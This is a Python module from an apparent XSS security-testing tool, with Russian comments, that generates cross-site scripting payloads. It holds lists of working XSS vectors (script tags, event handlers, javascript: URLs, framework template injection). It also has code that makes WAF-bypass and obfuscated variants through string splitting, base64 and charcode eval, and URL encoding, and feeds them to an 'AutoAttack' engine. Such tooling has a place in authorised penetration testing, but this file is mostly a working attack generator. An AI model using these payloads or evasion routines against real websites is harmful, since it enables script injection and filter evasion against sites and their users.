# xss_security_gui/payload_generator.py
"""
PayloadGenerator 7.0 — AGGRESSIVE MODULES 4.0

Особенности:
• ML‑подобная генерация (эвристики + контекст)
• Расширенная библиотека XSS payload’ов
• Полная аналитика (entropy, pattern, risk, context, total_score, fingerprint)
• CSP‑aware, DOM‑aware, WAF‑aware, Framework‑aware
• Интеграция с PayloadManager, ThreatConnector, MutatorTaskManager
• Полная совместимость с AttackEngine 7.0 / ThreatEngine 12.0
"""

from __future__ import annotations

import base64
import logging
import random
import threading
import urllib.parse
from typing import List, Dict, Optional, Any

from xss_security_gui.payloads import PAYLOADS, PAYLOAD_CATEGORIES
from xss_security_gui.threat_analysis.threat_connector import THREAT_CONNECTOR
from xss_security_gui.payload_mutator import mutate_async as MUTATE_ASYNC

log = logging.getLogger("PayloadGenerator7.0")


# ============================================================
#  Аналитика payload’ов — AGGRESSIVE 4.0
# ============================================================
def analyze_payload(payload: str, context: Optional[Dict] = None) -> Dict[str, Any]:
    """Возвращает расширенную аналитику payload’а."""
    context = context or {}
    p = payload.lower()

    entropy_score = len(set(payload))
    pattern_score = (
        (3 if "<script" in p else 0) +
        (3 if "onerror" in p else 0) +
        (2 if "svg" in p else 0) +
        (2 if "iframe" in p else 0)
    )
    risk_score = (
        (3 if "alert(" in p else 0) +
        (2 if "confirm(" in p else 0) +
        (2 if "prompt(" in p else 0)
    )
    context_score = (
        (2 if context.get("dom") else 0) +
        (2 if context.get("waf") else 0) +
        (1 if context.get("framework") else 0)
    )

    total_score = entropy_score + pattern_score + risk_score + context_score
    fingerprint = hash(payload[:200])

    severity = (
        "critical" if risk_score >= 3 else
        "high" if risk_score >= 2 else
        "medium"
    )

    return {
        "payload": payload,
        "entropy_score": entropy_score,
        "pattern_score": pattern_score,
        "risk_score": risk_score,
        "context_score": context_score,
        "total_score": total_score,
        "fingerprint": fingerprint,
        "severity": severity,
    }


# ============================================================
#  БАЗОВЫЕ PAYLOAD’Ы — AGGRESSIVE 4.0
# ============================================================

BASE_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<svg><desc><![CDATA[alert(1)]]></desc></svg>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=1 onerror=confirm(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<script src=data:text/javascript,alert(1)></script>",
]

CATEGORY_PATTERNS: Dict[str, List[str]] = {
    "Reflected": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ],
    "Stored": [
        "<script>alert('stored-xss')</script>",
        "<img src=x onerror=alert('stored')>",
    ],
    "DOM": [
        "<script>alert(location.hash)</script>",
        "<img src=x onerror=alert(document.domain)>",
    ],
    "Polyglot": [
        "<svg><script>alert(1)</script>",
        "<!--><script>alert(1)</script>-->",
    ],
    "Bypass": [
        "<img src=x onerror=window['al'+'ert'](1)>",
        "<script>self['al'+'ert'](1)</script>",
    ],
    "WAF": [
        "<script>self['al'+'ert'](1)</script>",
        "<img src=x onerror=window['al'+'ert'](1)>",
    ],
    "EventHandlers": [
        "<body onload=alert(1)>",
        "<div onclick=alert(1)>click</div>",
    ],
    "SVG": [
        "<svg/onload=alert(1)>",
        "<svg><desc><![CDATA[alert(1)]]></desc></svg>",
    ],
    "URL": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "Unicode": [
        "<script>alert('\\u0031')</script>",
        "<img src=x onerror=alert('\\u0031')>",
    ],
    "TemplateInjection": [
        "{{constructor.constructor('alert(1)')()}}",
        "{{7*7}}",
    ],
    "FrameworkSpecific": [
        "{{constructor.constructor('alert(1)')()}}",
        "<div v-on:click=\"alert(1)\">x</div>",
        "dangerouslySetInnerHTML={{__html:'<script>alert(1)</script>'}}",
    ],
}

# ============================================================
#  ML‑подобный генератор — AGGRESSIVE 4.0
# ============================================================

def _ml_suggest_payloads(
    category: str,
    count: int = 20,
    context: Optional[Dict] = None,
) -> List[Dict[str, Any]]:
    """Эмуляция LLM‑генерации с полной аналитикой."""
    context = context or {}
    framework = (context.get("framework") or "generic").lower()
    waf = bool(context.get("waf"))
    dom = bool(context.get("dom"))
    csp = context.get("csp", "")

    base_pool = CATEGORY_PATTERNS.get(category, BASE_PAYLOADS) + BASE_PAYLOADS
    results: List[Dict[str, Any]] = []

    for _ in range(count):
        base = random.choice(base_pool)
        p = base

        # DOM‑aware
        if dom and random.random() < 0.4:
            p = p.replace("alert(1)", "alert(document.domain)")

        # CSP‑aware
        if "script-src" in str(csp).lower() and random.random() < 0.4:
            p = "<script src=data:text/javascript,alert(1)></script>"

        # Framework‑aware
        if framework in ("angular", "vue", "react", "handlebars") and random.random() < 0.5:
            p = _framework_aware_payload(framework, p)

        # WAF‑aware
        if waf and random.random() < 0.6:
            p = _waf_bypass_variant(p)

        # Random obfuscation
        if random.random() < 0.5:
            p = _randomize_payload(p)

        results.append(analyze_payload(p, context))

    return results


def _framework_aware_payload(framework: str, base: str) -> str:
    fw = framework.lower()
    if fw == "angular":
        return "{{constructor.constructor('alert(1)')()}}"
    if fw == "vue":
        return "<div v-on:click=\"alert(1)\">x</div>"
    if fw == "react":
        return "dangerouslySetInnerHTML={{__html:'<script>alert(1)</script>'}}"
    if fw == "handlebars":
        return "{{#with \"\"}}{{#with \"\"}}{{/with}}{{/with}}<script>alert(1)</script>"
    return base


def _waf_bypass_variant(payload: str) -> str:
    variants = [
        payload.replace("alert", "window['al'+'ert']"),
        payload.replace("alert", "self['al'+'ert']"),
        payload.replace("<script>", "<scr" + "ipt>"),
    ]
    return random.choice(variants)


def _randomize_payload(payload: str) -> str:
    """Легкая обфускация без нарушения синтаксиса."""
    if "alert" in payload:
        return payload.replace("alert", "al" + "e" + "rt")
    return payload


# ============================================================
#  ПУБЛИЧНЫЙ API: ГЕНЕРАЦИЯ PAYLOAD’ОВ
# ============================================================

def generate_payloads(
    category: str = "Reflected",
    count: int = 20,
    smart: bool = True,
    context: Optional[Dict] = None,
) -> List[Dict[str, Any]]:
    """Генерирует payload’ы с полной аналитикой."""
    if category not in PAYLOAD_CATEGORIES:
        category = "Reflected"

    if smart:
        return _ml_suggest_payloads(category, count=count, context=context)

    results = []
    for _ in range(count):
        base = random.choice(BASE_PAYLOADS)
        p = _randomize_payload(base)
        results.append(analyze_payload(p, context))

    return results


# ============================================================
#  ПУБЛИЧНЫЙ API: ГЕНЕРАЦИЯ ВАРИАЦИЙ ОДНОГО PAYLOAD’А
# ============================================================

def generate_variants(payload: str, context: Optional[Dict] = None) -> List[Dict[str, Any]]:
    """Создаёт расширенный набор вариаций payload’а с аналитикой."""
    context = context or {}
    waf = bool(context.get("waf"))

    variants = set()
    variants.add(payload)

    try:
        # Base64
        b64 = base64.b64encode(payload.encode()).decode()
        variants.add(f"<script>eval(atob('{b64}'))</script>")

        # CharCode
        charcodes = ','.join(str(ord(c)) for c in payload)
        variants.add(f"<script>eval(String.fromCharCode({charcodes}))</script>")

        # URL encoding
        variants.add(urllib.parse.quote(payload))

        # Double URL encoding
        variants.add(urllib.parse.quote(urllib.parse.quote(payload)))

        # WAF‑aware
        if waf:
            variants.add(_waf_bypass_variant(payload))

    except Exception as e:
        log.error(f"Ошибка генерации вариантов: {e}")

    final = []
    for v in variants:
        final.append(analyze_payload(v, context))

    return final

# ============================================================
#  ПОТОКОВЫЙ ГЕНЕРАТОР + ИНТЕГРАЦИЯ С MUTATOR — AGGRESSIVE 4.0
# ============================================================

class PayloadGeneratorThread(threading.Thread):
    """
    AGGRESSIVE MODULES 4.0:
    • принимает payload (строка)
    • генерирует варианты (dict с аналитикой)
    • сохраняет payload-варианты в PayloadManager (только строка)
    • отправляет варианты в MutatorTaskManager (если включено)
    • отправляет расширенное событие в ThreatConnector
    """

    def __init__(
        self,
        category: str,
        payload: str,
        context: Optional[Dict[str, Any]] = None,
        integrate_mutator: bool = False,
        framework: str = "generic",
    ):
        super().__init__(daemon=True)
        self.category = category
        self.payload = payload
        self.context = context or {}
        self.integrate_mutator = integrate_mutator
        self.framework = framework

    def run(self):
        try:
            log.info(f"[PG7.0] Генерация вариантов для payload: {self.payload}")

            # Генерация вариантов (каждый — dict с аналитикой)
            variants = generate_variants(self.payload, context=self.context)

            added = 0
            mutator_count = 0
            mutator_errors = 0

            for v in variants:
                variant_payload = v["payload"]  # строка

                # Сохранение в PayloadManager
                if PAYLOADS.add(self.category, variant_payload):
                    added += 1

                    # Интеграция с MutatorTaskManager
                    if self.integrate_mutator:
                        try:
                            MUTATE_ASYNC(self.category, variant_payload, framework=self.framework)
                            mutator_count += 1
                        except Exception as me:
                            mutator_errors += 1
                            log.error(f"[PG7.0] Mutator error: {me}")

            # Threat Intel event
            event_fingerprint = hash(str(variants)[:500])

            THREAT_CONNECTOR.emit(
                module="PayloadGenerator7.0",
                target=self.category,
                result={
                    "severity": "info",
                    "category": "payload_generation",
                    "source": "PayloadGenerator7.0",
                    "payload_original": self.payload,
                    "generated_total": len(variants),
                    "added_to_db": added,
                    "mutator_sent": mutator_count,
                    "mutator_errors": mutator_errors,
                    "variants_preview": variants[:5],  # dict-анализ
                    "context": self.context,
                    "framework": self.framework,
                    "fingerprint": event_fingerprint,
                },
            )

            log.info(
                f"[PG7.0] Генерация завершена: добавлено {added}, "
                f"mutator={mutator_count}, errors={mutator_errors}"
            )

        except Exception as e:
            log.error(f"[PG7.0] Ошибка в PayloadGeneratorThread: {e}")

            THREAT_CONNECTOR.emit(
                module="PayloadGenerator7.0",
                target=self.category,
                result={
                    "severity": "error",
                    "category": "payload_generation",
                    "source": "PayloadGenerator7.0",
                    "message": str(e),
                    "fingerprint": hash(str(e)),
                },
            )


# ============================================================
#  УПРОЩЁННЫЙ API ДЛЯ GUI / AUTOATTACK — AGGRESSIVE 4.0
# ============================================================

def generate_payload_async(
    category: str,
    payload: str,
    context: Optional[Dict[str, Any]] = None,
    integrate_mutator: bool = False,
    framework: str = "generic",
) -> PayloadGeneratorThread:
    """
    ULTRA‑MODE Payload Generation Launcher (AGGRESSIVE MODULES 4.0)

    • Максимально безопасный запуск генерации payload-вариантов
    • Автоматическая нормализация и обогащение контекста
    • ThreatConnector: событие старта + fingerprint
    • Полная совместимость с PayloadGeneratorThread
    • Heatmap‑готовая структура для ThreatEngine 12.0
    • Логирование в стиле AttackEngine 7.0
    """

    # ------------------------------
    # Валидация входных данных
    # ------------------------------
    if not isinstance(payload, str) or not payload.strip():
        raise ValueError("generate_payload_async: payload must be a non-empty string")

    if category not in PAYLOAD_CATEGORIES:
        log.warning(f"[PG7.0] Unknown category '{category}', fallback → Reflected")
        category = "Reflected"

    # ------------------------------
    # Нормализация контекста
    # ------------------------------
    context = context or {}

    normalized_context = {
        "framework": (framework or "generic").lower(),
        "waf": bool(context.get("waf")),
        "dom": bool(context.get("dom")),
        "csp": context.get("csp", ""),
        "source": context.get("source", "auto"),
        "attack_id": context.get("attack_id"),
        "autoattack": context.get("autoattack", False),
        "timestamp": context.get("timestamp"),
    }

    # ------------------------------
    # Автоматическое обогащение контекста
    # ------------------------------
    # Если payload содержит DOM‑паттерны → включаем dom=True
    p = payload.lower()
    if any(k in p for k in ("location", "hash", "innerhtml", "outerhtml", "eval(")):
        normalized_context["dom"] = True

    # Если payload содержит WAF‑bypass паттерны → включаем waf=True
    if any(k in p for k in ("self['al'+'ert']", "window['al'+'ert']", "scr" "ipt")):
        normalized_context["waf"] = True

    # Если payload содержит CSP‑sensitive паттерны → включаем csp-aware
    if "script-src" in str(context.get("csp", "")).lower():
        normalized_context["csp"] = context.get("csp")

    # ------------------------------
    # Fingerprint события
    # ------------------------------
    event_fingerprint = hash(
        f"{category}:{payload}:{framework}:{str(normalized_context)[:300]}"
    )

    # ------------------------------
    # ThreatConnector: событие запуска
    # ------------------------------
    THREAT_CONNECTOR.emit(
        module="PayloadGenerator7.0",
        target=category,
        result={
            "severity": "info",
            "category": "payload_generation_start",
            "payload": payload,
            "context": normalized_context,
            "integrate_mutator": integrate_mutator,
            "framework": framework,
            "fingerprint": event_fingerprint,
        },
    )

    # ------------------------------
    # Логирование
    # ------------------------------
    log.info(
        f"[PG7.0] ▶ Старт генерации payload-вариантов "
        f"(category={category}, mutator={integrate_mutator}, framework={framework})"
    )

    # ------------------------------
    # Запуск потока
    # ------------------------------
    t = PayloadGeneratorThread(
        category=category,
        payload=payload,
        context=normalized_context,
        integrate_mutator=integrate_mutator,
        framework=framework,
    )
    t.start()

    return t

